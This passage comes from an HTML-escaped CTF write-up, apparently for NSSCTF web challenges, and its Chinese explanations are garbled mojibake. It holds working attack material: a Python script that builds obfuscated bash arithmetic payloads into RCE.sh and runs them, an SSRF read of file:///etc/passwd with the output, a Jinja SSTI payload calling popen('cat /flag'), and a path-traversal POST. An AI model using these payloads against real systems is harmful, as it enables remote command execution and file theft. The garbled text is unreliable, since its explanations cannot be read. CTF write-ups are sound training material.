lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import os.path&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def mult_times(str, m, n):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    front_len = m&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if front_len &amp;gt; len(str):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        front_len = len(str)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    front = str[:front_len]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = &amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for i in range(n):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        result = result + front&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return result&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# ТъёжђатЈѓТЋ░&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;quot;ТЈљуц║№╝џ$(($&amp;#123;_&amp;#125;))=0№╝ї$((~$(($&amp;#123;_&amp;#125;))))=-1&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;quot;У»иУЙЊтЁЦСйаУдЂТъёжђауџёТЋ░тГЌ&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;n = int(input(&amp;quot;ТъёжђауџёТЋ░тГЌ:&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;yuanshi = mult_times(&amp;#x27;$((~$(())))&amp;#x27;, 11, n + 1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fushu = mult_times(&amp;#x27;$((~$(())))&amp;#x27;, 11, n)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;quot;тјЪтДІТЋ░ТЇ«№╝џ&amp;quot;, yuanshi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;q = &amp;#x27;~$((&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = &amp;#x27;))&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;#x27;уггСИђТгАтЈќтЈЇу╗ЊТъюСИ║№╝џ&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(q + yuanshi + p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;FSQF = (q + fushu + p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b = &amp;#x27;$((~$((&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;c = &amp;#x27;))))&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ZX = &amp;#x27;echo&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;end = (ZX + &amp;quot; &amp;quot; + b + yuanshi + c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;FSQF2 = ZX + &amp;quot; &amp;quot; + q + fushu + p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;#x27;ТюђтљјТъёжђаТГБТЋ░у╗ЊТъюСИ║№╝џ&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(end)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;#x27;ТюђтљјТъёжђаУ┤ЪТЋ░у╗ЊТъюСИ║№╝џ&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(FSQF2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# у╗ЊТъютєЎтЁЦ&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;current_path = os.getcwd()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file_path = os.path.join(current_path, &amp;#x27;RCE.sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file_test = open(file_path, &amp;#x27;w+&amp;#x27;, encoding=&amp;#x27;utf-8&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file_test.write(end)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file_test.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;current_path = os.getcwd()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file_path = os.path.join(current_path, &amp;#x27;RCE2.sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file_test = open(file_path, &amp;#x27;w+&amp;#x27;, encoding=&amp;#x27;utf-8&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file_test.write(FSQF2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file_test.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# У┐ЏУАїтѕцТќГ&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;quot;тѕцТќГТюЅТЋѕ№╝ЂУЙЊтЄ║ТГБТЋ░ТЋ░тГЌСИ║№╝џ&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;os.system(&amp;quot;chmod +x RCE.sh;bash RCE.sh&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;quot;тѕцТќГТюЅТЋѕ№╝ЂУЙЊтЄ║У┤ЪТЋ░ТЋ░тГЌСИ║№╝џ&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;os.system(&amp;quot;chmod +x RCE.sh;bash RCE2.sh&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;2-ТхЈУДѕтЎеС╣ЪУЃйтЦЌтеЃ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-ТхЈУДѕтЎеС╣ЪУЃйтЦЌтеЃ&#34;&gt;#&lt;/a&gt; 2сђЂТхЈУДѕтЎеС╣ЪУЃйтЦЌтеЃ№╝Ъ&lt;/h2&gt;
&lt;p&gt;РђІ	ТЈљуц║ТѕЉС╗гУЙЊтЁЦСИђСИф URL№╝їуїюТхІСИђСИІТў» SSRF Т╝ЈТ┤ъ№╝їТЌаУёЉС╝аСИђСИф &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5iYWlkdS5jb20=&#34;&gt;http://www.baidu.com&lt;/span&gt;№╝їтЈЉуј░ТѕљтіЪС║є№╝їС╝аСИІ file:///etc/passwd тЈЉуј░УЃйУАїсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin utmp:x:100:406:utmp:/home/utmp:/bin/false nginx:x:101:101:nginx:/var/lib/nginx:/sbin/nologin &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	уЏ┤ТјЦУ»╗тЈќТа╣уЏ«тйЋуџё flag ТќЄС╗Х№╝їуюІуюІТюЅТ▓АТюЅ№╝їтЙѕТўјТўЙТюЅ№╝їpayload file:///flag&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;NSSCTF&amp;#123;9088fd46-7dbc-4235-9b88-4f81a53d0c89&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;3-СИђСИфТ▒атГљ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-СИђСИфТ▒атГљ&#34;&gt;#&lt;/a&gt; 3сђЂСИђСИфРђд Т▒атГљ№╝Ъ&lt;/h2&gt;
&lt;p&gt;РђІ	тѕџт╝ђтДІС╗ЦСИ║Тў» SQL Т│етЁЦ№╝їу╗ЊТъюТіЊтїЁСИЇт░Јт┐ЃуюІтѕ░С║єУ┐ЎСИф№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;404&lt;/span&gt; NOT FOUND&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Server&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;Werkzeug/3.0.3 Python/3.10.14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;Wed, 05 Jun 2024 08:52:31 GMT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;text/html; charset=utf-8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;207&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;close&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	тЙѕТўЙуёХТў»СИф flask ТАєТъХ№╝їтЈдтцќ№╝їТѕЉС╗гУЙЊтЁЦС╗ђС╣ѕ№╝їт«ЃУиЪуЮђУЙЊтЄ║ТЮЦС║є№╝їТјеТхІтЈ»УЃйТў» ssti Т╝ЈТ┤ъ№╝їуЏ┤ТјЦСИђТііТбГ№╝їТѕќУђЁСИђТГЦТГЦТЮЦ№╝їТюђу╗ѕТъёжђауџё payload тдѓСИІ№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;&amp;#x27;&amp;#x27;.__class__.__base__.__subclasses__()[137].__init__.__globals__[&amp;#x27;popen&amp;#x27;](&amp;quot;cat+/flag&amp;quot;).read()&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	ТюђтљјТІ┐тѕ░ flag№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;NSSCTF&amp;#123;f9c874a6-9276-470c-b37b-b999b23fee0e&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;4-жФўС║«СИ╗жбўтѕњТјЅУЃїТЎ»ТЪЦуюІтЎе&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-жФўС║«СИ╗жбўтѕњТјЅУЃїТЎ»ТЪЦуюІтЎе&#34;&gt;#&lt;/a&gt; 4сђЂжФўС║«СИ╗жбў (тѕњТјЅ) УЃїТЎ»ТЪЦуюІтЎе&lt;/h2&gt;
&lt;p&gt;РђІ	тєЇуће hackbar уџёТЌХтђЎ№╝їуѓ╣С║єСИІ POST Тќ╣Т│Ћ№╝їТ▓АТЃ│тѕ░уюІтѕ░С║єТюЅТёЈТђЮуџёСИюУЦ┐№╝їт░▒Тў» theme тЈѓТЋ░№╝їСй┐ућеС║єСИђСИфТќЄС╗Х№╝їТ»ЈуїюжћЎт║ћУ»ЦТў»ТќЄС╗ХтїЁтљФТ╝ЈТ┤ъ№╝їТЌаУёЉТбГтЊѕСИђСИф POST №╝џ theme=Рђд/Рђд/Рђд/Рђд/flag&lt;/p&gt;
&lt;p&gt;РђІ	ТюђтљјтЙЌтѕ░ flagсђѓ&lt;/p&gt;
&lt;h2 id=&#34;5-exx&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5-exx&#34;&gt;#&lt;/a&gt; 5сђЂexx&lt;/h2&gt;
